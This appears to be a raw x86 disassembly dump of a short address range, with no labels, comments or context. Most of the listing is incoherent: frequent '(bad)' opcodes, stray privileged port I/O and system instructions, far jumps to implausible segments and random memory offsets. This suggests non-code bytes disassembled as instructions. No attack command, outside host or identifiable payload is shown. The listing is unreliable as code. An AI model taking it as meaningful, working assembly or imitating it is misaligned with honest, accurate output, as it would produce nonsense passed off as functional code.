  4311aa:	ins    DWORD PTR es:[edi],dx
  4311ab:	inc    ebp
  4311ac:	add    BYTE PTR [esi+0x66],bh
  4311af:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4311b6:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4311c0:	dec    edi
  4311c1:	pop    es
  4311c2:	add    ah,ch
  4311c4:	mov    DWORD PTR [ebp+0x68],eax
  4311c7:	in     eax,dx
  4311c8:	inc    DWORD PTR [ebp-0x7d]
  4311cb:	out    0xc0,al
  4311cd:	inc    ebp
  4311ce:	mov    edx,esp
  4311d0:	push   0x45
  4311d2:	(bad)  
  4311d3:	jmp    0xdf925790
  4311d8:	add    BYTE PTR [ebp-0x77],al
  4311db:	out    dx,al
  4311dc:	ins    BYTE PTR es:[edi],dx
  4311dd:	inc    ebp
  4311de:	jmp    edi
  4311e0:	add    DWORD PTR [ebp-0x14],0x7e
  4311e4:	mov    esi,esi
  4311e6:	outs   dx,BYTE PTR ds:[esi]
  4311e7:	inc    esp
  4311e8:	(bad)  
  4311e9:	mov    esp,0x8341b68d
  4311ee:	mov    DWORD PTR [esi+0x70],eax
  4311f1:	fcos   
  4311f3:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  4311f9:	in     al,dx
  4311fa:	jb     0x431181
  4311fc:	(bad)  
  4311fd:	dec    DWORD PTR [ebx-0x7aba9901]
  431203:	mov    edi,edi
  431205:	fdivr  st,st(7)
  431207:	out    dx,eax
  431208:	rcl    BYTE PTR [ebx],0x66
  43120b:	mov    DWORD PTR [ebp-0xc70075],eax
  431211:	(bad)  
  431212:	std    
  431213:	cmp    eax,DWORD PTR [eax]
  431215:	jne    0x43127d
  431217:	mov    DWORD PTR [ebp-0xba0048],eax
  43121d:	in     al,dx
  43121e:	outs   dx,BYTE PTR ds:[esi]
  43121f:	pushf  
  431220:	add    BYTE PTR [ebx-0x7f7a039a],cl
  431226:	inc    DWORD PTR [ecx]
  431228:	inc    DWORD PTR [eax]
  43122a:	jae    0x431264
  43122c:	add    BYTE PTR [ebp+0x850266],al
  431232:	inc    DWORD PTR [ebp-0x1]
  431235:	mov    eax,eax
  431237:	jl     0x43129f
  431239:	add    BYTE PTR [ebp-0x740077],al
  43123f:	cld    
  431240:	dec    eax
  431241:	add    BYTE PTR [eax],0x1
  431244:	data16 add BYTE PTR [ebp+0x38],al
  431248:	mov    eax,0x47c2
  43124d:	mov    eax,0x824f89
  431252:	inc    edi
  431253:	mov    DWORD PTR [edx+0x64],ebp
  431256:	inc    WORD PTR [ebp-0x75]
  43125a:	(bad)  
  43125b:	data16 rol BYTE PTR [ebp-0x16001a],1
  431262:	inc    ebp
  431263:	jge    0x431244
  431265:	add    bh,ah
  431267:	lea    ax,[ebp-0x750030]
  43126e:	add    al,0x46
  431271:	jmp    0x40ff:0x8885
  431277:	push   DWORD PTR [ebp+0x52]
  43127a:	lea    eax,[eax]
  43127c:	shl    BYTE PTR [esi-0x7b],1
  43127f:	test   esi,edi
  431281:	(bad)  
  431282:	(bad)  
  431283:	inc    DWORD PTR [ebp-0x990140]
  431289:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43128f:	inc    edi
  431290:	push   ecx
  431291:	xor    ax,WORD PTR [ebp-0x8d0045]
  431298:	add    al,al
  43129a:	ret    
  43129b:	mov    ax,WORD PTR [ebp-0x3f0004]
  4312a2:	push   eax
  4312a3:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4312aa:	add    BYTE PTR [ebx-0x764f8839],al
  4312b0:	push   DWORD PTR [esi+0x1]
  4312b3:	inc    DWORD PTR [eax]
  4312b5:	mov    eax,0xff99ff
  4312ba:	or     BYTE PTR [ecx-0x7a87bb],cl
  4312c0:	jne    0x43127a
  4312c2:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4312cc:	mov    ecx,0xd74fb8
  4312d1:	add    cl,al
  4312d3:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4312d9:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4312e0:	(bad)  
  4312e1:	push   ebp
  4312e3:	mov    eax,0x8c2789
  4312e8:	ret    0x6689
  4312eb:	adc    BYTE PTR [ebp+0x48],0x8d
  4312ef:	add    bh,ah
  4312f1:	mov    WORD PTR [ebp-0x70],ax
  4312f5:	(bad)  
  4312f6:	ret    0x667d
  4312f9:	or     BYTE PTR [ebp-0x77],dl
  4312fc:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431303:	loop   0x43128e
  431305:	(bad)  
  431306:	xchg   esi,eax
  431307:	aam    0xcf
  431309:	out    dx,al
  43130a:	mov    DWORD PTR [esi-0x68],edi
  43130d:	inc    ebp
  43130e:	dec    edx
  43130f:	pop    ecx
  431310:	mov    edx,DWORD PTR [eax]
  431312:	repnz push bp
  431315:	or     BYTE PTR [ebx+0x55106638],0x49
  43131c:	(bad)  
  43131d:	repnz xor eax,0xa0898945
  431323:	mov    ah,0x89
  431325:	jmp    DWORD PTR [edx+0x66b0418d]
  43132b:	inc    DWORD PTR [ebp+0x50]
  43132e:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431332:	mov    DWORD PTR [eax],ecx
  431334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431335:	pop    es
  431336:	inc    ecx
  431337:	(bad)  
  431338:	data16 fwait
  43133a:	inc    ebp
  43133b:	xor    ah,BYTE PTR [esi+0x3]
  43133e:	dec    ebp
  43133f:	push   eax
  431340:	inc    bp
  431342:	jge    0x4312c7
  431344:	mov    esp,DWORD PTR [esi-0x18]
  431347:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  43134d:	add    DWORD PTR [ebx],esi
  43134f:	add    BYTE PTR [ebx],al
  431351:	test   DWORD PTR [ebx],esi
  431353:	(bad)  
  431354:	inc    WORD PTR [ebp+0x0]
  431358:	mov    eax,DWORD PTR [eax]
  43135a:	call   0x8898ca8f
  43135f:	mov    esi,eax
  431361:	clc    
  431362:	ret    
  431363:	rol    cl,0xa
  431366:	mov    DWORD PTR ds:0x7c0ec88,esi
  43136c:	mov    edx,edi
  43136e:	pushf  
  43136f:	pop    es
  431370:	jmp    FWORD PTR [edx+0x66]
  431373:	add    BYTE PTR [ebp-0x990175],al
  431379:	inc    ebp
  43137a:	test   DWORD PTR [ebx-0x2f00f202],eax
  431380:	push   ebp
  431381:	mov    edi,eax
  431383:	mov    dh,BYTE PTR [eax+0x266ff51]
  431389:	push   ebp
  43138a:	add    BYTE PTR [ebx-0x764b0777],al
  431390:	dec    DWORD PTR [esi+0x661851e8]
  431396:	add    BYTE PTR [ebp-0x7b],dl
  431399:	cmp    esi,0xfffffffb
  43139c:	dec    DWORD PTR [ecx+0x51fe9285]
  4313a2:	jmp    DWORD PTR [esi-0x75]
  4313a5:	push   ebp
  4313a6:	hlt    
  4313a7:	data16 (bad) 
  4313a9:	dec    ebp
  4313aa:	ret    
  4313ab:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4313b1:	lea    edx,[eax-0x1]
  4313b4:	jne    0x431387
  4313b6:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4313bc:	dec    BYTE PTR [ecx+0x51559eff]
  4313c2:	mov    DWORD PTR [esi-0x4c],esp
  4313c5:	push   ebp
  4313c6:	jmp    DWORD PTR [esi-0x18]
  4313c9:	inc    ebp
  4313ca:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4313d0:	(bad)  
  4313d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4313d2:	inc    eax
  4313d4:	test   DWORD PTR [esi-0x2],esp
  4313d7:	inc    ebp
  4313d8:	dec    DWORD PTR [ebp-0x760bde75]
  4313de:	(bad)  
  4313df:	test   al,0xc3
  4313e1:	mov    DWORD PTR [ebp-0x769b56],ecx
  4313e7:	lods   al,BYTE PTR ds:[esi]
  4313e8:	push   eax
  4313e9:	inc    ebp
  4313ea:	jne    0x4313fb
  4313ec:	dec    DWORD PTR [ebp+0x8]
  4313ef:	mov    ecx,DWORD PTR [ebx]
  4313f1:	sbb    al,0x0
  4313f3:	(bad)  
  4313f4:	mov    eax,0xc14fc3
  4313f9:	mov    DWORD PTR [ecx-0xbabf64],ecx
  4313ff:	movsx  ecx,WORD PTR [ebp+0x4e]
  431403:	xor    eax,DWORD PTR [eax]
  431405:	add    eax,edi
  431407:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43140d:	xor    edi,DWORD PTR [eax+0x854f66]
  431413:	dec    BYTE PTR [ecx-0x76bb01]
  431419:	mov    BYTE PTR [ebx-0x76724001],al
  43141f:	pushf  
  431420:	inc    esi
  431421:	(bad)  
  431422:	dec    DWORD PTR [ebp-0x7abe6373]
  431428:	sar    esi,0x89
  43142b:	dec    DWORD PTR [eax+0x0]
  43142e:	inc    DWORD PTR [eax]
  431430:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  431437:	xlat   BYTE PTR ds:[ebx]
  431438:	dec    edx
  431439:	add    bh,bh
  43143b:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431441:	lea    esp,[esi-0x50]
  431444:	(bad)  
  431445:	(bad)  
  431446:	call   DWORD PTR [eax-0x1]
  431449:	inc    ebp
  43144a:	rdpmc  
  43144c:	add    BYTE PTR [ebx],al
  43144e:	push   ax
  431450:	lea    eax,[ebp-0x1]
  431456:	js     0x431457
  431458:	add    al,bh
  43145a:	push   bp
  43145c:	lea    ecx,[ebp-0x7701]
  431462:	fmul   DWORD PTR [ebp-0x7a997800]
  431468:	(bad)  
  431469:	(bad)  
  43146a:	(bad)  
  43146b:	(bad)  
  43146c:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431472:	dec    eax
  431473:	mov    eax,0x8d8dffff
  431478:	mov    al,0xb0
  43147a:	(bad)  
  43147b:	call   DWORD PTR [ecx+0x50]
  43147e:	dec    ebp
  43147f:	inc    ebp
  431480:	mov    esi,0x7030833
  431485:	push   eax
  431486:	into   
  431487:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43148d:	call   DWORD PTR [ecx-0x8]
  431490:	lea    edx,[ebp-0x1]
  431493:	jmp    0x761697
  431498:	inc    eax
  431499:	jnp    0x431428
  43149b:	add    dh,bh
  43149d:	inc    WORD PTR [ebp-0x8a00b0]
  4314a4:	mov    edx,eax
  4314a6:	inc    esp
  4314a7:	add    bh,bh
  4314a9:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4314af:	dec    DWORD PTR [ebx-0x7f820301]
  4314b5:	add    BYTE PTR [ecx],al
  4314b7:	data16 add BYTE PTR [ebp-0xb30077],al
  4314be:	inc    eax
  4314c0:	(bad)  
  4314c1:	dec    si
  4314c3:	test   edi,edi
  4314c5:	(bad)  
  4314c6:	cmp    edi,edi
  4314c8:	add    ecx,DWORD PTR [edi-0x39]
  4314cb:	mov    edx,DWORD PTR [edx+0x66]
  4314ce:	inc    DWORD PTR [ebp-0x3d00cb]
  4314d4:	mov    eax,0x66ff8b5e
  4314da:	jmp    0xb4ff:0xc7ff3895
  4314e1:	push   ecx
  4314e2:	inc    DWORD PTR [ebx-0x76ffccbb]
  4314e8:	call   DWORD PTR [esi-0x1]
  4314eb:	dec    DWORD PTR [eax]
  4314ed:	mov    ecx,0x805ff
  4314f2:	inc    ebp
  4314f3:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  4314f9:	mov    ecx,0x35784
  4314fe:	add    BYTE PTR [ecx-0xffa59b],cl
  431504:	inc    ebp
  431505:	mov    ecx,0x9c6131
  43150a:	(bad)  
  43150b:	mov    eax,ebx
  43150d:	pop    esp
  43150e:	test   edi,edi
  431510:	clc    
  431511:	lea    eax,[ebp-0x24]
  431514:	cmp    eax,0xc7fe9c8d
  431519:	push   eax
  43151b:	lea    eax,[ebp+0x45fff8fe]
  431521:	mov    esi,DWORD PTR [ecx]
  431523:	hlt    
  431524:	lahf   
  431525:	push   esp
  431526:	mov    edx,DWORD PTR [ecx-0x4]
  431529:	xor    eax,DWORD PTR [eax+0x7201bb]
  43152f:	add    BYTE PTR [ebp-0x35],al
  431532:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  431538:	mov    edx,DWORD PTR [ecx-0x74]
  43153b:	rol    BYTE PTR [eax],0x8d
  43153e:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431542:	nop
  431543:	push   ecx
  431544:	add    bh,bh
  431546:	mov    esp,edi
  431548:	in     al,0x85
  43154a:	jge    0x43154a
  43154c:	test   edi,edi
  43154e:	jne    0x4314d5
  431550:	(bad)  
  431551:	(bad)  
  431552:	sbb    bh,bh
  431554:	push   ebp
  431555:	inc    ebp
  431556:	call   0xffdc0fe6
  43155b:	add    BYTE PTR [ebp+0x66],al
  43155e:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431564:	cmp    al,0x85
  431566:	ud0    eax,DWORD PTR [ebp-0x1]
  43156a:	test   DWORD PTR [edi+0x74],ecx
  43156d:	dec    edi
  43156e:	inc    DWORD PTR [ebp-0x530004]
  431574:	dec    DWORD PTR [edi-0x75]
  431577:	dec    esi
  431578:	cld    
  431579:	test   DWORD PTR [eax+0xff01ff],eax
  43157f:	icebp  
  431580:	add    BYTE PTR [edi-0x3a],cl
  431583:	test   ebx,eax
  431585:	inc    BYTE PTR [ebp-0x1]
  431588:	jne    0x43158a
  43158a:	mov    eax,DWORD PTR [eax]
  43158c:	cld    
  43158d:	xor    BYTE PTR [ecx+0x500155],cl
  431593:	push   ebp
  431594:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43159a:	add    BYTE PTR [ebp+0x35e90f50],al
  4315a0:	add    al,BYTE PTR [eax]
  4315a2:	add    BYTE PTR [ebx-0x38fe4f80],al
  4315a8:	add    ah,ch
  4315aa:	or     BYTE PTR [ebp+0x4501f845],dh
  4315b0:	jmp    0xdf18a6
  4315b5:	(bad)  
  4315b6:	nop    ecx
  4315b9:	test   DWORD PTR [ebp+0x4502f8],eax
  4315bf:	xor    ecx,DWORD PTR [ebp-0x64]
  4315c2:	mov    eax,edi
  4315c4:	mov    ebx,DWORD PTR [eax+edx*2]
  4315c7:	add    eax,0x45fef885
  4315cc:	dec    DWORD PTR [ebx+0x339445]
  4315d2:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4315d8:	dec    DWORD PTR [ebx-0x460f0375]
  4315de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4315df:	add    esi,edi
  4315e1:	add    bh,bh
  4315e3:	rdpmc  
  4315e5:	add    BYTE PTR [ebx],0x1
  4315e8:	mov    DWORD PTR [eax],eax
  4315ea:	add    al,0x45
  4315ec:	dec    DWORD PTR [ecx-0x360b3373]
  4315f2:	dec    DWORD PTR [esi]
  4315f4:	push   eax
  4315f5:	jne    0x43163c
  4315f7:	mov    esi,DWORD PTR [ebx]
  4315f9:	cld    
  4315fa:	add    esp,ecx
  4315fc:	push   eax
  4315fd:	inc    DWORD PTR [ebp-0x75]
  431600:	add    eax,0x800e4
  431605:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43160b:	mov    DWORD PTR [ecx],eax
  43160d:	sbb    al,0x0
  43160f:	leave  
  431610:	test   DWORD PTR [edi-0x2],eax
  431613:	jne    0x431614
  431615:	call   0xff44001a
  43161a:	xor    BYTE PTR [ebp+0x4d],al
  43161d:	mov    edi,edi
  43161f:	enter  0x8,0x4d
  431623:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  431629:	mov    eax,DWORD PTR [eax]
  43162b:	cld    
  43162c:	add    DWORD PTR [ecx],ebx
  43162e:	inc    ebp
  43162f:	dec    ebp
  431630:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  431636:	inc    eax
  431637:	dec    DWORD PTR [ecx-0x270375]
  43163d:	add    BYTE PTR [ebx-0x39d72701],cl
  431643:	xchg   ecx,eax
  431644:	ret    
  431645:	add    BYTE PTR [ebp-0x830075],al
  43164b:	add    BYTE PTR [ebp-0x75],al
  43164e:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431654:	lea    edi,[edi-0xc]
  431657:	add    bh,bh
  431659:	mov    edx,DWORD PTR [eax-0x7b]
  43165c:	inc    ebp
  43165d:	rdpmc  
  43165f:	jne    0x431664
  431661:	add    BYTE PTR [eax-0x75],dl
  431664:	inc    ebp
  431665:	clc    
  431666:	add    eax,0x400009
  43166b:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431671:	mov    eax,DWORD PTR [ecx]
  431673:	in     al,dx
  431674:	add    dh,al
  431676:	test   ebx,eax
  431678:	inc    BYTE PTR [ebp-0xff0001]
  43167e:	add    BYTE PTR [ebp-0x43],al
  431681:	cmp    esi,0xfffffff8
  431684:	(bad)  
  431685:	push   DWORD PTR [eax]
  431687:	add    BYTE PTR [ebp-0x3a],dl
  43168a:	test   ebx,eax
  43168c:	je     0x431613
  43168e:	mov    edi,edi
  431690:	sbb    al,0xff
  431692:	test   DWORD PTR gs:[eax],eax
  431695:	(bad)  
  431696:	js     0x431697
  431698:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43169e:	sub    eax,ebx
  4316a0:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4316a6:	add    eax,DWORD PTR [eax]
  4316a8:	dec    ebp
  4316a9:	push   eax
  4316aa:	mov    al,BYTE PTR [ebp+0x1]
  4316ad:	mov    eax,DWORD PTR [ebp-0x68]
  4316b0:	mov    eax,DWORD PTR [eax]
  4316b2:	sbb    bh,al
  4316b4:	or     ah,dh
  4316b6:	dec    ebp
  4316b7:	inc    DWORD PTR [eax+0x4]
  4316ba:	push   ecx
  4316bb:	add    BYTE PTR [edx-0x1],dh
  4316be:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4316c4:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4316ce:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4316d4:	push   ecx
  4316d5:	cmp    BYTE PTR [ebx],al
  4316d7:	inc    ebp
  4316d8:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4316de:	(bad)  
  4316df:	(bad)  
  4316e0:	in     al,0xff
  4316e2:	add    BYTE PTR [ebp+0x0],al
  4316e5:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4316eb:	add    al,bh
  4316ed:	(bad)  
  4316ee:	jmp    0x8d85:0x74b0558d
  4316f5:	dec    DWORD PTR [eax]
  4316f7:	call   DWORD PTR [ebp-0x7b]
  4316fa:	mov    edi,esi
  4316fc:	lock call DWORD PTR [ebp-0x75]
  431700:	mov    esi,esp
  431702:	mov    ah,0xc6
  431704:	mov    bh,0xc3
  431706:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43170c:	add    DWORD PTR [eax],0x450050ff
  431712:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431718:	inc    edi
  43171a:	push   esp
  43171c:	jmp    0xcd00:0x650481ff
  431723:	mov    DWORD PTR [ebx],esi
  431725:	clc    
  431726:	cmp    edi,0xff9cff3c
  43172c:	jne    0x431736
  43172e:	mov    eax,eax
  431730:	add    esi,DWORD PTR [eax]
  431732:	int3   
  431733:	inc    ebp
  431734:	cmp    al,0x83
  431736:	add    BYTE PTR [eax],bl
  431738:	adc    DWORD PTR [ebx+0x768b5055],eax
  43173e:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431744:	mov    edi,eax
  431746:	cmp    BYTE PTR [ebp+0x45],cl
  431749:	jmp    0x4316d6
  43174b:	mov    ebx,DWORD PTR [esp+ebp*8]
  43174e:	inc    ebp
  43174f:	or     al,0x2
  431751:	dec    DWORD PTR [ebp+0x18]
  431754:	jne    0x4317ab
  431756:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  43175c:	mov    edi,DWORD PTR [ebx]
  43175e:	in     al,0x50
  431760:	xchg   ecx,eax
  431761:	jmp    0x3436666
  431766:	adc    al,0x8b
  431768:	inc    ebp
  431769:	mov    al,ds:0x8b04008b
  43176e:	push   ebp
  43176f:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431775:	push   ebp
  431776:	test   DWORD PTR [ebx-0x2800d701],ecx
  43177c:	inc    ebp
  43177d:	dec    ebp
  43177e:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431784:	mov    DWORD PTR [eax],0xe9ff00f4
  43178a:	add    al,0x0
  43178c:	add    BYTE PTR [eax],al
  43178e:	mov    eax,edx
  431790:	push   eax
  431791:	rol    DWORD PTR [ebp-0xf0177],1
  431797:	bound  eax,QWORD PTR [ebp+0x50]
  43179a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4317a0:	add    BYTE PTR [ecx+0x558df0ff],cl
  4317a6:	mov    al,0xf
  4317a8:	test   DWORD PTR [edx],edx
  4317aa:	call   DWORD PTR [ebp-0x7a0001]
  4317b0:	(bad)  
  4317b1:	loop   0x4317b2
  4317b3:	jnp    0xc6990bb9
  4317b9:	mov    eax,ebx
  4317bb:	cmp    al,0x8b
  4317bd:	(bad)  
  4317be:	cld    
  4317bf:	shr    esi,0xc
  4317c2:	add    dl,al
  4317c4:	push   eax
  4317c5:	lea    eax,[ebp-0x1]
  4317c8:	mov    edx,esi
  4317ca:	cwde   
  4317cb:	cli    
  4317cc:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4317d2:	or     BYTE PTR [eax],cl
  4317d4:	inc    ebp
  4317d5:	dec    ebp
  4317d6:	inc    DWORD PTR [ebx+0x74803914]
  4317dc:	add    DWORD PTR [ebx+0x451800],ecx
  4317e2:	call   DWORD PTR [eax+edx*1]
  4317e5:	add    ecx,DWORD PTR [ebp-0x34]
  4317e8:	push   edi
  4317e9:	adc    al,0x8
  4317eb:	mov    edx,DWORD PTR [ebp-0x14]
  4317ee:	mov    ecx,DWORD PTR [ebp+0x18]
  4317f1:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4317f5:	inc    DWORD PTR [eax+esi*8]
  4317f8:	inc    ebp
  4317f9:	stos   BYTE PTR es:[edi],al
  4317fa:	mov    edx,DWORD PTR [ebp-0x4]
  4317fd:	add    DWORD PTR [ebp-0x1c],eax
  431800:	mov    edx,DWORD PTR [ebp-0x70]
  431803:	cmp    eax,DWORD PTR [eax]
  431805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431806:	mov    eax,DWORD PTR [eax]
  431808:	cld    
  431809:	jae    0x43178b
  43180b:	add    eax,DWORD PTR [ecx]
  43180d:	clc    
  43180e:	add    BYTE PTR [eax+0x30],dl
  431811:	mov    DWORD PTR [ecx],esi
  431813:	clc    
  431814:	pop    ds
  431815:	inc    ebp
  431816:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43181c:	(bad)  
  43181d:	push   DWORD PTR [edi]
  43181f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431825:	(bad)  
  431826:	jae    0x431827
  431828:	mov    eax,DWORD PTR [ebp-0x740175]
  43182e:	sub    eax,DWORD PTR [eax]
  431830:	add    eax,DWORD PTR [eax]
  431832:	mov    DWORD PTR [ecx+0x5f],eax
  431835:	mov    DWORD PTR [ebx-0x4],ebx
  431838:	ret    0xff
  43183b:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431841:	ret    
  431842:	mov    eax,DWORD PTR [ebp-0x6f0075]
  431848:	add    BYTE PTR [ebp-0x7d],al
  43184b:	mov    DWORD PTR [eax],eax
  43184d:	add    al,0x84
  43184f:	inc    DWORD PTR [ecx]
  431851:	lea    eax,[eax]
  431853:	hlt    
  431854:	sar    bh,cl
  431856:	test   BYTE PTR [eax+0x1],dl
  431859:	inc    ebp
  43185a:	add    BYTE PTR [ebx],dh
  43185c:	test   BYTE PTR [ebx],0x84
  43185f:	push   eax
  431860:	add    BYTE PTR [ebp+0x0],al
  431863:	add    eax,0x86
  431868:	add    BYTE PTR [ebx-0x7f7b0340],cl
  43186e:	add    BYTE PTR [ecx],al
  431870:	add    BYTE PTR [eax],al
  431872:	mov    esi,0x550030
  431877:	mov    ecx,DWORD PTR [edi]
  431879:	cld    
  43187a:	fidiv  DWORD PTR [ebp+0x0]
  43187d:	mov    edi,DWORD PTR [ecx]
  43187f:	xor    BYTE PTR [eax+eax*1],0x84
  431883:	add    eax,DWORD PTR [eax]
  431885:	sbb    BYTE PTR [eax],al
  431887:	jne    0x43183a
  431889:	mov    eax,DWORD PTR [ecx]
  43188b:	sbb    BYTE PTR [eax],al
  43188d:	mov    DWORD PTR [ebp-0x1],esp
  431890:	add    BYTE PTR [eax+0x30e45ca],bh
  431896:	ret    0xb7fc
  431899:	dec    ebp
  43189a:	or     al,0x89
  43189c:	dec    ebp
  43189d:	cld    
  43189e:	cmovne ecx,DWORD PTR [eax-0x75]
  4318a2:	add    edi,esp
  4318a4:	seto   BYTE PTR [esi-0x72ffffff]
  4318ab:	inc    ebp
  4318ac:	adc    al,0x8b
  4318ae:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4318b5:	cmp    DWORD PTR [edi+0x72],edx
  4318b8:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4318be:	gs cmp al,0x0
  4318c1:	je     0x431899
  4318c3:	push   eax
  4318c4:	sar    BYTE PTR [eax],1
  4318c6:	mov    bh,0x3e
  4318c8:	push   cs
  4318c9:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4318cf:	add    DWORD PTR [ecx+0x12],ebp
  4318d2:	dec    edx
  4318d3:	(bad)  
  4318d4:	mov    eax,edx
  4318d6:	in     al,dx
  4318d7:	adc    DWORD PTR [ecx],esi
  4318d9:	pop    esi
  4318da:	inc    ecx
  4318db:	leave  
  4318dc:	or     DWORD PTR [eax],ebx
  4318de:	gs push ebp
  4318e0:	add    ah,ch
  4318e2:	into   
  4318e3:	in     al,dx
  4318e4:	enter  0xb756,0xf0
  4318e8:	push   cs
  4318e9:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4318f3:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4318f9:	jnp    0x74439e01
  4318ff:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431905:	add    BYTE PTR [edi],cl
  431907:	mov    edi,DWORD PTR [ecx-0x78]
  43190a:	ltr    WORD PTR [ecx-0x7b]
  43190e:	dec    DWORD PTR [edi]
  431910:	clc    
  431911:	out    0x45,eax
  431913:	add    BYTE PTR [eax],cl
  431915:	cmp    ebx,0xffffff8c
  431918:	jge    0x43191a
  43191a:	jb     0x43192c
  43191c:	je     0x52199c
  431922:	pop    edx
  431923:	push   esi
  431924:	mov    ecx,DWORD PTR [edi]
  431926:	in     al,dx
  431927:	rol    DWORD PTR [ebp+0x0],1
  43192a:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431931:	cmp    DWORD PTR [ecx],0xfffffff0
  431934:	hlt    
  431935:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43193b:	(bad)  
  43193d:	push   eax
  43193e:	jns    0xb842fdbc
  431944:	lock push cs
  431946:	ror    edx,0x3
  431949:	test   BYTE PTR [ecx+0x5500e800],cl
  43194f:	dec    eax
  431950:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431954:	(bad)  
  431955:	mov    esi,0x7f33ff5f
  43195a:	inc    eax
  43195b:	test   DWORD PTR [edx],eax
  43195d:	je     0x43191f
  43195f:	mov    ecx,ecx
  431961:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431965:	and    eax,DWORD PTR [eax+0xf0103]
  43196b:	jp     0x431959
  43196d:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431971:	add    edx,DWORD PTR [edi+0x74]
  431974:	sbb    BYTE PTR [ebp+0x4d001484],cl
  43197a:	add    BYTE PTR [ebp-0x74c48bbb],al
  431980:	je     0x431905
  431982:	cmp    eax,edi
  431984:	js     0x4319a9
  431986:	add    eax,0xeb0fc003
  43198b:	jns    0x431918
  43198d:	vmread DWORD PTR [ecx+0x45],ebx
  431991:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431997:	adc    al,0x8b
  431999:	jge    0x4319af
  43199b:	mov    edi,DWORD PTR [eax-0x4]
  43199e:	add    edi,DWORD PTR [edi]
  4319a0:	or     bh,bh
  4319a2:	push   ebp
  4319a3:	push   es
  4319a4:	mov    DWORD PTR [ebp-0x4],ebx
  4319a7:	add    edi,esi
  4319a9:	pop    es
  4319aa:	add    esi,DWORD PTR [edi-0x48ccf183]
  4319b0:	mov    DWORD PTR [esp+esi*8],ecx
  4319b3:	inc    ebp
  4319b4:	pop    ebp
  4319b5:	xor    DWORD PTR [esi-0x4],0x3b
  4319b9:	add    edx,DWORD PTR [ecx+edi*1]
  4319bc:	push   es
  4319bd:	clc    
  4319be:	mov    bh,0xdb
  4319c0:	jp     0x431979
  4319c2:	add    cl,BYTE PTR [esi]
  4319c4:	div    DWORD PTR [edi+0x4d8b0c1c]
  4319ca:	test   edi,edi
  4319cc:	je     0x4319c2
  4319ce:	mov    eax,ecx
  4319d0:	or     BYTE PTR [ebx],al
  4319d2:	dec    BYTE PTR [ecx+0x7d3bec7d]
  4319d8:	jbe    0x431a4c
  4319da:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  4319e0:	add    ecx,DWORD PTR [esi]
  4319e2:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  4319e8:	add    eax,DWORD PTR [ebx-0x287af783]
  4319ee:	je     0x431a3d
  4319f0:	mov    DWORD PTR [ecx],edi
  4319f2:	mov    esi,eax
  4319f4:	hlt    
  4319f5:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  4319fc:	jb     0x4319be
  4319fe:	jmp    0x4319eb
  431a00:	xor    esi,DWORD PTR [ebx]
  431a02:	pop    edi
  431a03:	pop    esi
  431a04:	pop    ebx
  431a05:	ret    
  431a06:	ret    0x8b
